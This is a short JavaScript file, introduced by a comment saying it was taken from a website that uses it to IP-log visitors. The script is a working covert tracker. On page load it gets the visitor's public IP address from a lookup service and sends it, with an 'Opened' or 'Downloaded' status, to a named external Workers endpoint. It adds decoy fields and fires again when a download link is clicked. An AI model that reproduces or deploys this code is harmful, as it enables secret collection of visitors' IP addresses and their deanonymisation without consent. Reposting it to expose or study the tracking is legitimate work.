// this is the script from the fyreac.space that they use to ip log you <3

(async function () {
  const IPIFY_URL = "https://api.ipify.org?format=json";
  const EXFIL_URL =
    "https://crimson-tree-cf44.blaher331.workers.dev/api/sasd2";

  let status = "Opened";
  const downloadEl = document.querySelector(".dl");

  if (downloadEl) {
    downloadEl.addEventListener("click", () => {
      status = "Downloaded";
    });
  }

  let ip = null;

  try {
    const res = await fetch(IPIFY_URL, { cache: "no-store" });
    if (!res.ok) return;

    const text = await res.text();
    let data;

    try {
      data = JSON.parse(text);
    } catch {
      return;
    }

    ip = data && data.ip ? String(data.ip) : null;
    if (!ip) return;
  } catch {
    return;
  }

  const send = async () => {
    try {
      await fetch(EXFIL_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          ip: ip,
          comment: status,
          fake1: "127.0.0.1",
          fake2: "0.0.0.0",
          junk: Math.random()
        }),
        keepalive: true
      });
    } catch {}
  };

  await send();

  if (downloadEl) {
    downloadEl.addEventListener(
      "click",
      () => {
        send();
      },
      { once: true }
    );
  }
})();